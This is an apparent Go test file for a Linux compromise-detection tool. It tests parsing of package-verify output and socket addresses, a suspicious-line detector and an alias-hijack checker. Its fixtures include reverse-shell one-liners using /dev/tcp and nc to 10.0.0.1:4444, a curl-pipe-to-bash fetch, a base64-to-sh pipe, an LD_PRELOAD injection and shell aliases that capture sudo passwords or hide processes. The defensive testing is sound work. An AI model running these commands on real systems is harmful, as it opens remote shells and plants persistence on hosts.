//go:build linux

package target

import "testing"

func TestParseVerifyLine(t *testing.T) {
	cases := []struct {
		pm, line, path, attrs string
		conf, ok              bool
	}{
		{"rpm", "S.5....T.    /usr/sbin/sshd", "/usr/sbin/sshd", "S.5....T.", false, true},
		{"rpm", ".M.......  c /etc/ssh/sshd_config", "/etc/ssh/sshd_config", ".M.......", true, true},
		{"rpm", "missing     /usr/share/doc/x", "/usr/share/doc/x", "missing", false, true},
		{"rpm", "Unsatisfied dependencies for foo", "", "", false, false},
		{"dpkg", "??5??????   /usr/sbin/nologin", "/usr/sbin/nologin", "??5??????", false, true},
		{"pacman", "warning: openssh: /usr/bin/sshd (SHA256 checksum mismatch)", "/usr/bin/sshd", "SHA256 checksum mismatch", false, true},
		{"pacman", "iproute2: 45 total files, 0 altered files", "", "", false, false},
	}
	for _, c := range cases {
		p, a, conf, ok := parseVerifyLine(c.pm, c.line)
		if p != c.path || a != c.attrs || conf != c.conf || ok != c.ok {
			t.Errorf("%q: got (%q %q %v %v)", c.line, p, a, conf, ok)
		}
	}
}

func TestParseHexAddr(t *testing.T) {
	ip, port := parseHexAddr("0100007F:0016")
	if ip.String() != "127.0.0.1" || port != 22 {
		t.Fatalf("got %s:%d", ip, port)
	}
	ip, port = parseHexAddr("00000000000000000000000001000000:01BB")
	if ip.String() != "::1" || port != 443 {
		t.Fatalf("v6 got %s:%d", ip, port)
	}
}

func TestSuspicious(t *testing.T) {
	bad := []string{
		"*/5 * * * * root /tmp/.sysupd.bin install",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"curl -s http://x/a.sh | bash",
		"Environment=LD_PRELOAD=/usr/lib/libudev-cache.so.1",
		"echo aGk= | base64 -d | sh",
		"nc -e /bin/sh 10.0.0.1 4444",
	}
	good := []string{
		"17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly",
		"ExecStart=/usr/sbin/sshd -D $OPTIONS",
		"PrivateTmp=true",
		"session    required     pam_limits.so",
	}
	for _, s := range bad {
		if !suspicious(s) {
			t.Errorf("missed: %s", s)
		}
	}
	for _, s := range good {
		if suspicious(s) {
			t.Errorf("false positive: %s", s)
		}
	}
	for line, want := range map[string]bool{
		"alias sudo='sudo -S'":                       true,
		"alias ls='/tmp/.ls'":                        true,
		"alias ps='ps | grep -v rt-tagd'":            true,
		"alias rm='rm -i'":                           false,
		"alias grep='grep --color=auto' 2>/dev/null": false,
		"alias ll='ls -l'":                           false,
	} {
		if got := isAliasHijack(line); got != want {
			t.Errorf("isAliasHijack(%q) = %v, want %v", line, got, want)
		}
	}
}
